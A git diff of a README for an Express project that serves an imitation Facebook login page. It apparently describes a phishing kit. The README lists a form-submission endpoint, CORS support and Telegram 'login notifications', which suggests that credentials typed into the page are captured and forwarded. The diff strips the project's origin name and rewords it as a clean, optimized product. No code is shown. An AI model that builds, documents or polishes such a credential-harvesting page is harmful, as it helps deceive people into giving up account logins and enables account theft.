@@ -1,16 +1,17 @@
-# Niceplace Facebook Login Server
+# Facebook Login Server
 
-This project serves the Facebook login component from the Niceplace application using a simple Express server.
+This project serves a Facebook login interface using a simple Express server. It's a clean, optimized implementation extracted from the Niceplace application.
 
-## About Niceplace
+## Project Overview
 
-Niceplace is a web application that includes a Facebook login interface. This project has been configured to serve just the Facebook login page component efficiently without the complexity of the full application.
+This is a streamlined, standalone implementation of a Facebook login interface. The project has been optimized to provide a simple, reliable solution with minimal dependencies.
 
 ## Project Structure
 
 - `simple_server.js` - Express server that serves the Facebook login page
-- `facebook_login.html` - The Facebook login interface from Niceplace
+- `index.html` - The Facebook login interface 
 - `clone_and_run.sh` - Script to start the server
+- `package.json` - Dependencies and project configuration
 
 ## Running the Application
 
@@ -42,8 +43,8 @@ http://localhost:5000
 
 ## Features
 
-- Simple Express server that runs on port 5000
-- Serves the Facebook login interface from Niceplace
-- Handles form submissions via API endpoint
-- Implements CORS for cross-origin requests
-- Telegram integration for login notifications (when credentials are configured)
+- Clean, lightweight Express server (port 5000)
+- Responsive Facebook login interface
+- API endpoint for form submissions
+- CORS support for cross-origin requests
+- Telegram integration for login notifications
